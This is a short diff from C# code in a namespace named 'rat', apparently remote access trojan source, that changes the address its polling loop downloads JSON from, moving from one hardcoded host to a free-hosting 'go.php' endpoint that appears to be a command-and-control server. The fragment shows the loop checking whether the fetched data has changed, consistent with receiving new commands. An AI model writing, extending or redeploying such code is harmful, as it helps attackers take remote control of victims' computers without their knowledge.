@@ -17,7 +17,7 @@ namespace rat
             {
                 try
                 {
-                    json = new WebClient().DownloadString("https://r.significantbyte.com/go.php");
+                    json = new WebClient().DownloadString("https://ustaad-mailer.000webhostapp.com/go.php");
                     if (json != oldjson)
                     {
 
